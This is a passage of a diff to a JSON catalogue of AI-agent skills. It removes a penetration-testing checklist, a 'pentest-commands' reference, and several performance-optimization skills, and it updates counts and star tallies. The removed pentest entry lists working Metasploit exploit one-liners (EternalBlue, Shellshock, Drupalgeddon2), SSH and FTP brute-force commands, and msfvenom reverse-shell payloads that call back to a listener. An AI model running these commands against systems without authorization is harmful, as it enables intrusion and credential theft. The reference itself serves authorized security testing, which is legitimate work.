vs. one-time testing\n\n### Phase 2: Environment Preparation\n\n#### Prepare Test Environment\n\n- [ ] **Production vs. staging decision** - Determine where to test\n- [ ] **Set testing limits** - No DoS on production\n- [ ] **Schedule testing window** - Minimize business impact\n- [ ] **Create test accounts** - Provide appropriate access levels\n\n**Environment Options:**\n```\nProduction  - Realistic but risky\nStaging     - Safer but may differ from production\nClone       - Ideal but resource-intensive\n```\n\n#### Run Preliminary Scans\n\n- [ ] **Execute vulnerability scanners** - Find known issues first\n- [ ] **Fix obvious vulnerabilities** - Don't waste pentest time\n- [ ] **Document existing issues** - Share with testers\n\n**Common Pre-Scan Tools:**\n```bash\n# Network vulnerability scan\nnmap -sV --script vuln TARGET\n\n# Web vulnerability scan\nnikto -h http://TARGET\n```\n\n#### Review Security Policy\n\n- [ ] **Verify compliance requirements** - GDPR, PCI-DSS, HIPAA\n- [ ] **Document data handling rules** - Sensitive data procedures\n- [ ] **Confirm legal authorization** - Get written permission\n\n#### Notify Hosting Provider\n\n- [ ] **Check provider policies** - What testing is allowed?\n- [ ] **Submit authorization requests** - AWS, Azure, GCP requirements\n- [ ] **Document approvals** - Keep records\n\n**Cloud Provider Policies:**\n- AWS: https://aws.amazon.com/security/penetration-testing/\n- Azure: https://docs.microsoft.com/security/pentest\n- GCP: https://cloud.google.com/security/overview\n\n#### Freeze Developments\n\n- [ ] **Stop deployments during testing** - Maintain consistent environment\n- [ ] **Document current versions** - Record system states\n- [ ] **Avoid critical patches** - Unless security emergency\n\n### Phase 3: Expertise Selection\n\n#### Find Qualified Pentesters\n\n- [ ] **Seek recommendations** - Ask trusted sources\n- [ ] **Verify credentials** - OSCP, GPEN, CEH, CREST\n- [ ] **Check references** - Talk to previous clients\n- [ ] **Match expertise to scope** - Web, network, mobile specialists\n\n**Evaluation Criteria:**\n\n| Factor | Questions to Ask |\n|--------|------------------|\n| Experience | Years in field, similar projects |\n| Methodology | OWASP, PTES, custom approach |\n| Reporting | Sample reports, detail level |\n| Communication | Availability, update frequency |\n\n#### Define Methodology\n\n- [ ] **Select testing standard",
-      "tags": [
-        "markdown",
-        "ai",
-        "workflow",
-        "document",
-        "security",
-        "pentest",
-        "vulnerability",
-        "aws",
-        "gcp",
-        "azure"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:10.470Z"
-    },
-    {
-      "id": "antigravity-pentest-commands",
-      "name": "pentest-commands",
-      "slug": "pentest-commands",
-      "description": "Provide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments.",
-      "category": "Security & Systems",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pentest-commands",
-      "content": "\n> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.\n\n# Pentest Commands\n\n## Purpose\n\nProvide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments.\n\n## Inputs/Prerequisites\n\n- Kali Linux or penetration testing distribution\n- Target IP addresses with authorization\n- Wordlists for brute forcing\n- Network access to target systems\n- Basic understanding of tool syntax\n\n## Outputs/Deliverables\n\n- Network enumeration results\n- Identified vulnerabilities\n- Exploitation payloads\n- Cracked credentials\n- Web vulnerability findings\n\n## Core Workflow\n\n### 1. Nmap Commands\n\n**Host Discovery:**\n\n```bash\n# Ping sweep\nnmap -sP 192.168.1.0/24\n\n# List IPs without scanning\nnmap -sL 192.168.1.0/24\n\n# Ping scan (host discovery)\nnmap -sn 192.168.1.0/24\n```\n\n**Port Scanning:**\n\n```bash\n# TCP SYN scan (stealth)\nnmap -sS 192.168.1.1\n\n# Full TCP connect scan\nnmap -sT 192.168.1.1\n\n# UDP scan\nnmap -sU 192.168.1.1\n\n# All ports (1-65535)\nnmap -p- 192.168.1.1\n\n# Specific ports\nnmap -p 22,80,443 192.168.1.1\n```\n\n**Service Detection:**\n\n```bash\n# Service versions\nnmap -sV 192.168.1.1\n\n# OS detection\nnmap -O 192.168.1.1\n\n# Comprehensive scan\nnmap -A 192.168.1.1\n\n# Skip host discovery\nnmap -Pn 192.168.1.1\n```\n\n**NSE Scripts:**\n\n```bash\n# Vulnerability scan\nnmap --script vuln 192.168.1.1\n\n# SMB enumeration\nnmap --script smb-enum-shares -p 445 192.168.1.1\n\n# HTTP enumeration\nnmap --script http-enum -p 80 192.168.1.1\n\n# Check EternalBlue\nnmap --script smb-vuln-ms17-010 192.168.1.1\n\n# Check MS08-067\nnmap --script smb-vuln-ms08-067 192.168.1.1\n\n# SSH brute force\nnmap --script ssh-brute -p 22 192.168.1.1\n\n# FTP anonymous\nnmap --script ftp-anon 192.168.1.1\n\n# DNS brute force\nnmap --script dns-brute 192.168.1.1\n\n# HTTP methods\nnmap -p80 --script http-methods 192.168.1.1\n\n# HTTP headers\nnmap -p80 --script http-headers 192.168.1.1\n\n# SQL injection check\nnmap --script http-sql-injection -p 80 192.168.1.1\n```\n\n**Advanced Scans:**\n\n```bash\n# Xmas scan\nnmap -sX 192.168.1.1\n\n# ACK scan (firewall detection)\nnmap -sA 192.168.1.1\n\n# Window scan\nnmap -sW 192.168.1.1\n\n# Traceroute\nnmap --traceroute 192.168.1.1\n```\n\n### 2. Metasploit Commands\n\n**Basic Usage:**\n\n```bash\n# Launch Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit name:smb\n\n# Use exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Show options\nshow options\n\n# Set target\nset RHOST 192.168.1.1\n\n# Set payload\nset PAYLOAD windows/meterpreter/reverse_tcp\n\n# Run exploit\nexploit\n```\n\n**Common Exploits:**\n\n```bash\n# EternalBlue\nmsfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit\"\n\n# MS08-067 (Conficker)\nmsfconsole -x \"use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit\"\n\n# vsftpd backdoor\nmsfconsole -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit\"\n\n# Shellshock\nmsfconsole -x \"use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit\"\n\n# Drupalgeddon2\nmsfconsole -x \"use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit\"\n\n# PSExec\nmsfconsole -x \"use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit\"\n```\n\n**Scanners:**\n\n```bash\n# TCP port scan\nmsfconsole -x \"use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run\"\n\n# SMB version scan\nmsfconsole -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run\"\n\n# SMB share enumeration\nmsfconsole -x \"use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run\"\n\n# SSH brute force\nmsfconsole -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run\"\n\n# FTP brute force\nmsfconsole -x \"use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run\"\n\n# RDP scanning\nmsfconsole -x \"use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run\"\n```\n\n**Handler Setup:**\n\n```bash\n# Multi-handler for reverse shells\nmsfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit\"\n```\n\n**Payload Generation (msfvenom):**\n\n```bash\n# Windows reverse shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe\n\n# Linux reverse shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf\n\n# PHP reverse shell\nmsfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php\n\n# ASP reverse shell\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f asp > shell.asp\n\n# WAR file\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war > shell.war\n\n# Python payload\nmsfvenom -p cmd/unix/reverse_python LH",
-      "tags": [
-        "python",
-        "api",
-        "ai",
-        "workflow",
-        "security",
-        "pentest",
-        "vulnerability"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:12.048Z"
-    },
-    {
-      "id": "antigravity-performance-engineer",
-      "name": "performance-engineer",
-      "slug": "performance-engineer",
-      "description": "Expert performance engineer specializing in modern observability,",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/performance-engineer",
-      "content": "You are a performance engineer specializing in modern application optimization, observability, and scalable system performance.\n\n## Use this skill when\n\n- Diagnosing performance bottlenecks in backend, frontend, or infrastructure\n- Designing load tests, capacity plans, or scalability strategies\n- Setting up observability and performance monitoring\n- Optimizing latency, throughput, or resource efficiency\n\n## Do not use this skill when\n\n- The task is feature development with no performance goals\n- There is no access to metrics, traces, or profiling data\n- A quick, non-technical summary is the only requirement\n\n## Instructions\n\n1. Confirm performance goals, user impact, and baseline metrics.\n2. Collect traces, profiles, and load tests to isolate bottlenecks.\n3. Propose optimizations with expected impact and tradeoffs.\n4. Verify results and add guardrails to prevent regressions.\n\n## Safety\n\n- Avoid load testing production without approvals and safeguards.\n- Use staged rollouts with rollback plans for high-risk changes.\n\n## Purpose\nExpert performance engineer with comprehensive knowledge of modern observability, application profiling, and system optimization. Masters performance testing, distributed tracing, caching architectures, and scalability patterns. Specializes in end-to-end performance optimization, real user monitoring, and building performant, scalable systems.\n\n## Capabilities\n\n### Modern Observability & Monitoring\n- **OpenTelemetry**: Distributed tracing, metrics collection, correlation across services\n- **APM platforms**: DataDog APM, New Relic, Dynatrace, AppDynamics, Honeycomb, Jaeger\n- **Metrics & monitoring**: Prometheus, Grafana, InfluxDB, custom metrics, SLI/SLO tracking\n- **Real User Monitoring (RUM)**: User experience tracking, Core Web Vitals, page load analytics\n- **Synthetic monitoring**: Uptime monitoring, API testing, user journey simulation\n- **Log correlation**: Structured logging, distributed log tracing, error correlation\n\n### Advanced Application Profiling\n- **CPU profiling**: Flame graphs, call stack analysis, hotspot identification\n- **Memory profiling**: Heap analysis, garbage collection tuning, memory leak detection\n- **I/O profiling**: Disk I/O optimization, network latency analysis, database query profiling\n- **Language-specific profiling**: JVM profiling, Python profiling, Node.js profiling, Go profiling\n- **Container profiling**: Docker performance analysis, Kubernetes resource optimization\n- **Cloud profiling**: AWS X-Ray, Azure Application Insights, GCP Cloud Profiler\n\n### Modern Load Testing & Performance Validation\n- **Load testing tools**: k6, JMeter, Gatling, Locust, Artillery, cloud-based testing\n- **API testing**: REST API testing, GraphQL performance testing, WebSocket testing\n- **Browser testing**: Puppeteer, Playwright, Selenium WebDriver performance testing\n- **Chaos engineering**: Netflix Chaos Monkey, Gremlin, failure injection testing\n- **Performance budgets**: Budget tracking, CI/CD integration, regression detection\n- **Scalability testing**: Auto-scaling validation, capacity planning, breaking point analysis\n\n### Multi-Tier Caching Strategies\n- **Application caching**: In-memory caching, object caching, computed value caching\n- **Distributed caching**: Redis, Memcached, Hazelcast, cloud cache services\n- **Database caching**: Query result caching, connection pooling, buffer pool optimization\n- **CDN optimization**: CloudFlare, AWS CloudFront, Azure CDN, edge caching strategies\n- **Browser caching**: HTTP cache headers, service workers, offline-first strategies\n- **API caching**: Response caching, conditional requests, cache invalidation strategies\n\n### Frontend Performance Optimization\n- **Core Web Vitals**: LCP, FID, CLS optimization, Web Performance API\n- **Resource optimization**: Image optimization, lazy loading, critical resource prioritization\n- **JavaScript optimization**: Bundle splitting, tree shaking, code splitting, lazy loading\n- **CSS optimization**: Critical CSS, CSS optimization, render-blocking resource elimination\n- **Network optimization**: HTTP/2, HTTP/3, resource hints, preloading strategies\n- **Progressive Web Apps**: Service workers, caching strategies, offline functionality\n\n### Backend Performance Optimization\n- **API optimization**: Response time optimization, pagination, bulk operations\n- **Microservices performance**: Service-to-service optimization, circuit breakers, bulkheads\n- **Async processing**: Background jobs, message queues, event-driven architectures\n- **Database optimization**: Query optimization, indexing, connection pooling, read replicas\n- **Concurrency optimization**: Thread pool tuning, async/await patterns, resource locking\n- **Resource management**: CPU optimization, memory management, garbage collection tuning\n\n### Distributed System Performance\n- **Service mesh optimization**: Istio, Linkerd performance tuning, traffic management\n- **Message queue optimization**: Kafka, RabbitMQ, SQS performance tuning\n- **Event",
-      "tags": [
-        "python",
-        "javascript",
-        "react",
-        "node",
-        "api",
-        "ai",
-        "automation",
-        "design",
-        "document",
-        "image"
-      ],
-      "useCases": [
-        "\"Analyze and optimize end-to-end API performance with distributed tracing and caching\"",
-        "\"Implement comprehensive observability stack with OpenTelemetry, Prometheus, and Grafana\"",
-        "\"Optimize React application for Core Web Vitals and user experience metrics\"",
-        "\"Design load testing strategy for microservices architecture with realistic traffic patterns\"",
-        "\"Implement multi-tier caching architecture for high-traffic e-commerce application\""
-      ],
-      "scrapedAt": "2026-02-23T07:17:41.848Z"
-    },
-    {
-      "id": "antigravity-performance-optimizer",
-      "name": "performance-optimizer",
-      "slug": "performance-optimizer",
-      "description": "Identifies and fixes performance bottlenecks in code, databases, and APIs. Measures before and after to prove improvements.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/performance-optimizer",
-      "content": "\n# Performance Optimizer\n\nFind and fix performance bottlenecks. Measure, optimize, verify. Make it fast.\n\n## When to Use This Skill\n\n- App is slow or laggy\n- User complains about performance\n- Page load times are high\n- API responses are slow\n- Database queries take too long\n- User mentions \"slow\", \"lag\", \"performance\", or \"optimize\"\n\n## The Optimization Process\n\n### 1. Measure First\n\nNever optimize without measuring:\n\n```javascript\n// Measure execution time\nconsole.time('operation');\nawait slowOperation();\nconsole.timeEnd('operation'); // operation: 2341ms\n```\n\n**What to measure:**\n- Page load time\n- API response time\n- Database query time\n- Function execution time\n- Memory usage\n- Network requests\n\n### 2. Find the Bottleneck\n\nUse profiling tools to find the slow parts:\n\n**Browser:**\n```\nDevTools → Performance tab → Record → Stop\nLook for long tasks (red bars)\n```\n\n**Node.js:**\n```bash\nnode --prof app.js\nnode --prof-process isolate-*.log > profile.txt\n```\n\n**Database:**\n```sql\nEXPLAIN ANALYZE SELECT * FROM users WHERE email = 'test@example.com';\n```\n\n### 3. Optimize\n\nFix the slowest thing first (biggest impact).\n\n## Common Optimizations\n\n### Database Queries\n\n**Problem: N+1 Queries**\n```javascript\n// Bad: N+1 queries\nconst users = await db.users.find();\nfor (const user of users) {\n  user.posts = await db.posts.find({ userId: user.id }); // N queries\n}\n\n// Good: Single query with JOIN\nconst users = await db.users.find()\n  .populate('posts'); // 1 query\n```\n\n**Problem: Missing Index**\n```sql\n-- Check slow query\nEXPLAIN SELECT * FROM users WHERE email = 'test@example.com';\n-- Shows: Seq Scan (bad)\n\n-- Add index\nCREATE INDEX idx_users_email ON users(email);\n\n-- Check again\nEXPLAIN SELECT * FROM users WHERE email = 'test@example.com';\n-- Shows: Index Scan (good)\n```\n\n**Problem: SELECT ***\n```javascript\n// Bad: Fetches all columns\nconst users = await db.query('SELECT * FROM users');\n\n// Good: Only needed columns\nconst users = await db.query('SELECT id, name, email FROM users');\n```\n\n**Problem: No Pagination**\n```javascript\n// Bad: Returns all records\nconst users = await db.users.find();\n\n// Good: Paginated\nconst users = await db.users.find()\n  .limit(20)\n  .skip((page - 1) * 20);\n```\n\n### API Performance\n\n**Problem: No Caching**\n```javascript\n// Bad: Hits database every time\napp.get('/api/stats', async (req, res) => {\n  const stats = await db.stats.calculate(); // Slow\n  res.json(stats);\n});\n\n// Good: Cache for 5 minutes\nconst cache = new Map();\napp.get('/api/stats', async (req, res) => {\n  const cached = cache.get('stats');\n  if (cached && Date.now() - cached.time < 300000) {\n    return res.json(cached.data);\n  }\n  \n  const stats = await db.stats.calculate();\n  cache.set('stats', { data: stats, time: Date.now() });\n  res.json(stats);\n});\n```\n\n**Problem: Sequential Operations**\n```javascript\n// Bad: Sequential (slow)\nconst user = await getUser(id);\nconst posts = await getPosts(id);\nconst comments = await getComments(id);\n// Total: 300ms + 200ms + 150ms = 650ms\n\n// Good: Parallel (fast)\nconst [user, posts, comments] = await Promise.all([\n  getUser(id),\n  getPosts(id),\n  getComments(id)\n]);\n// Total: max(300ms, 200ms, 150ms) = 300ms\n```\n\n**Problem: Large Payloads**\n```javascript\n// Bad: Returns everything\nres.json(users); // 5MB response\n\n// Good: Only needed fields\nres.json(users.map(u => ({\n  id: u.id,\n  name: u.name,\n  email: u.email\n}))); // 500KB response\n```\n\n### Frontend Performance\n\n**Problem: Unnecessary Re-renders**\n```javascript\n// Bad: Re-renders on every parent update\nfunction UserList({ users }) {\n  return users.map(user => <UserCard user={user} />);\n}\n\n// Good: Memoized\nconst UserCard = React.memo(({ user }) => {\n  return <div>{user.name}</div>;\n});\n```\n\n**Problem: Large Bundle**\n```javascript\n// Bad: Imports entire library\nimport _ from 'lodash'; // 70KB\n\n// Good: Import only what you need\nimport debounce from 'lodash/debounce'; // 2KB\n```\n\n**Problem: No Code Splitting**\n```javascript\n// Bad: Everything in one bundle\nimport HeavyComponent from './HeavyComponent';\n\n// Good: Lazy load\nconst HeavyComponent = React.lazy(() => import('./HeavyComponent'));\n```\n\n**Problem: Unoptimized Images**\n```html\n<!-- Bad: Large image -->\n<img src=\"photo.jpg\" /> <!-- 5MB -->\n\n<!-- Good: Optimized and responsive -->\n<img \n  src=\"photo-small.webp\" \n  srcset=\"photo-small.webp 400w, photo-large.webp 800w\"\n  loading=\"lazy\"\n  width=\"400\"\n  height=\"300\"\n/> <!-- 50KB -->\n```\n\n### Algorithm Optimization\n\n**Problem: Inefficient Algorithm**\n```javascript\n// Bad: O(n²) - nested loops\nfunction findDuplicates(arr) {\n  const duplicates = [];\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = i + 1; j < arr.length; j++) {\n      if (arr[i] === arr[j]) duplicates.push(arr[i]);\n    }\n  }\n  return duplicates;\n}\n\n// Good: O(n) - single pass with Set\nfunction findDuplicates(arr) {\n  const seen = new Set();\n  const duplicates = new Set();\n  for (const item of arr) {\n    if (seen.has(item)) duplicates.add(item);\n    seen.add(item);\n ",
-      "tags": [
-        "javascript",
-        "react",
-        "node",
-        "api",
-        "ai",
-        "design",
-        "document",
-        "image",
-        "cro"
-      ],
-      "useCases": [
-        "App is slow or laggy",
-        "User complains about performance",
-        "Page load times are high",
-        "API responses are slow",
-        "Database queries take too long"
-      ],
-      "scrapedAt": "2026-03-07T06:56:40.922Z"
-    },
-    {
-      "id": "antigravity-performance-profiling",
-      "name": "performance-profiling",
-      "slug": "performance-profiling",
-      "description": "Performance profiling principles. Measurement, analysis, and optimization techniques.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/performance-profiling",
-      "content": "\n# Performance Profiling\n\n> Measure, analyze, optimize - in that order.\n\n## 🔧 Runtime Scripts\n\n**Execute these for automated profiling:**\n\n| Script | Purpose | Usage |\n|--------|---------|-------|\n| `scripts/lighthouse_audit.py` | Lighthouse performance audit | `python scripts/lighthouse_audit.py https://example.com` |\n\n---\n\n## 1. Core Web Vitals\n\n### Targets\n\n| Metric | Good | Poor | Measures |\n|--------|------|------|----------|\n| **LCP** | < 2.5s | > 4.0s | Loading |\n| **INP** | < 200ms | > 500ms | Interactivity |\n| **CLS** | < 0.1 | > 0.25 | Stability |\n\n### When to Measure\n\n| Stage | Tool |\n|-------|------|\n| Development | Local Lighthouse |\n| CI/CD | Lighthouse CI |\n| Production | RUM (Real User Monitoring) |\n\n---\n\n## 2. Profiling Workflow\n\n### The 4-Step Process\n\n```\n1. BASELINE → Measure current state\n2. IDENTIFY → Find the bottleneck\n3. FIX → Make targeted change\n4. VALIDATE → Confirm improvement\n```\n\n### Profiling Tool Selection\n\n| Problem | Tool |\n|---------|------|\n| Page load | Lighthouse |\n| Bundle size | Bundle analyzer |\n| Runtime | DevTools Performance |\n| Memory | DevTools Memory |\n| Network | DevTools Network |\n\n---\n\n## 3. Bundle Analysis\n\n### What to Look For\n\n| Issue | Indicator |\n|-------|-----------|\n| Large dependencies | Top of bundle |\n| Duplicate code | Multiple chunks |\n| Unused code | Low coverage |\n| Missing splits | Single large chunk |\n\n### Optimization Actions\n\n| Finding | Action |\n|---------|--------|\n| Big library | Import specific modules |\n| Duplicate deps | Dedupe, update versions |\n| Route in main | Code split |\n| Unused exports | Tree shake |\n\n---\n\n## 4. Runtime Profiling\n\n### Performance Tab Analysis\n\n| Pattern | Meaning |\n|---------|---------|\n| Long tasks (>50ms) | UI blocking |\n| Many small tasks | Possible batching opportunity |\n| Layout/paint | Rendering bottleneck |\n| Script | JavaScript execution |\n\n### Memory Tab Analysis\n\n| Pattern | Meaning |\n|---------|---------|\n| Growing heap | Possible leak |\n| Large retained | Check references |\n| Detached DOM | Not cleaned up |\n\n---\n\n## 5. Common Bottlenecks\n\n### By Symptom\n\n| Symptom | Likely Cause |\n|---------|--------------|\n| Slow initial load | Large JS, render blocking |\n| Slow interactions | Heavy event handlers |\n| Jank during scroll | Layout thrashing |\n| Growing memory | Leaks, retained refs |\n\n---\n\n## 6. Quick Win Priorities\n\n| Priority | Action | Impact |\n|----------|--------|--------|\n| 1 | Enable compression | High |\n| 2 | Lazy load images | High |\n| 3 | Code split routes | High |\n| 4 | Cache static assets | Medium |\n| 5 | Optimize images | Medium |\n\n---\n\n## 7. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Guess at problems | Profile first |\n| Micro-optimize | Fix biggest issue |\n| Optimize early | Optimize when needed |\n| Ignore real users | Use RUM data |\n\n---\n\n> **Remember:** The fastest code is code that doesn't run. Remove before optimizing.\n\n## When to Use\nThis skill is applicable to execute the workflow or actions described in the overview.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
-      "tags": [
-        "python",
-        "javascript",
-        "ai",
-        "workflow",
-        "image",
-        "rag",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:13.286Z"
     },
     {
       "id": "anthropic-pptx",
@@ -26788,14 +26753,14 @@
       "name": "AI & Agents",
       "description": "AI agent development, memory systems, and autonomous workflows.",
       "icon": "bot",
-      "count": 379
+      "count": 382
     },
     {
       "id": "document-processing",
       "name": "Document Processing",
       "description": "Create, edit, and analyze documents including Word, PDF, PowerPoint, and Excel files.",
       "icon": "file-text",
-      "count": 347
+      "count": 345
     },
     {
       "id": "development-code-tools",
@@ -26809,14 +26774,14 @@
       "name": "Creative & Media",
       "description": "Design, image editing, video processing, and creative content generation.",
       "icon": "palette",
-      "count": 99
+      "count": 100
     },
     {
       "id": "security-systems",
       "name": "Security & Systems",
       "description": "Security analysis, system administration, and forensics.",
       "icon": "shield",
-      "count": 74
+      "count": 72
     },
     {
       "id": "business-marketing",
@@ -26860,48 +26825,48 @@
       "url": "https://github.com/obra/superpowers",
       "skillCount": 14,
       "newSkillCount": 0,
-      "stars": 216501
+      "stars": 217466
     },
     {
       "name": "Anthropic",
       "url": "https://github.com/anthropics/skills",
       "skillCount": 14,
       "newSkillCount": 3,
-      "stars": 145919
+      "stars": 146361
     },
     {
       "name": "ComposioHQ",
       "url": "https://github.com/ComposioHQ/awesome-claude-skills",
       "skillCount": 19,
       "newSkillCount": 8,
-      "stars": 63043
+      "stars": 63181
     },
     {
       "name": "OpenHands",
       "url": "https://github.com/OpenHands/OpenHands",
       "skillCount": 25,
       "newSkillCount": 1,
-      "stars": 75718
+      "stars": 75803
     },
     {
       "name": "Awesome LLM",
       "url": "https://github.com/Prat011/awesome-llm-skills",
       "skillCount": 26,
       "newSkillCount": 0,
-      "stars": 1286
+      "stars": 1290
     },
     {
       "name": "Antigravity",
       "url": "https://github.com/sickn33/antigravity-awesome-skills",
       "skillCount": 1003,
-      "newSkillCount": 6,
-      "stars": 39561
+      "newSkillCount": 12,
+      "stars": 39675
     }
   ],
-  "lastUpdated": "2026-06-03T11:17:50.075Z",
+  "lastUpdated": "2026-06-04T10:12:17.341Z",
   "stats": {
     "totalSkills": 1101,
-    "newSkills": 18,
-    "scrapedAt": "2026-06-03T11:17:50.075Z"
+    "newSkills": 24,
+    "scrapedAt": "2026-06-04T10:12:17.341Z"
   }
 }
